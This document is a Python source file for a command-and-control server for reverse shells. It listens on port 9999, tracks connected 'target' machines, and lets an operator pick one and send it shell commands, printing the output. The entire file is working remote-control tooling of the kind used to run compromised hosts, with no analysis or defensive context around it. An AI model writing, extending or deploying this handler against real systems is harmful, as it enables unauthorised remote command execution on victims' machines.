import socket
import sys
import threading
import queue

all_connnections = []
all_addresses = []
NUMBER_WORKERS = 2
NUMBER_JOBS = [1, 2]
queue = queue.Queue()

host = ''
port = 9999
s = socket.socket()

def init_server():
    try:
        s.bind((host, port))
        s.listen(10)
    except:
        s.close()
        sys.exit(0)

def accept_connections():
    while True:
        try:
            conn, address = s.accept()
            all_addresses.append(address)
            all_connnections.append(conn)
            print("Connection has been established: " + address[0])
        except:
            print("Error accepting connection")

def list_connections():
    print("---------- CONNECTIONS ----------")
    for index, address in enumerate(all_addresses):
        print(str(index) + " " + str(address[0]) + " " + str(address[1]))

def start_cmd():
    while True:
        cmd = input("cmd>")
        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            index = int(cmd.replace("select", ""))
            conn = all_connnections[index]
            address = all_addresses[index][0]
            send_target_commands(conn, address)

def send_target_commands(conn: socket.socket, address: str):
   while True:
        try:
            cmd = input(address + ">")
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break;
        except:
            print("Connection was lost")

def work():
    while True:
        x = queue.get()
        if x == 1:
            init_server()
            accept_connections()
        if x == 2:
            start_cmd()

def create_workers():
    for _ in range(NUMBER_WORKERS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def create_jobs():
    for x in NUMBER_JOBS:
        queue.put(x)
    queue.join()

def main():
    create_workers()
    create_jobs()

main()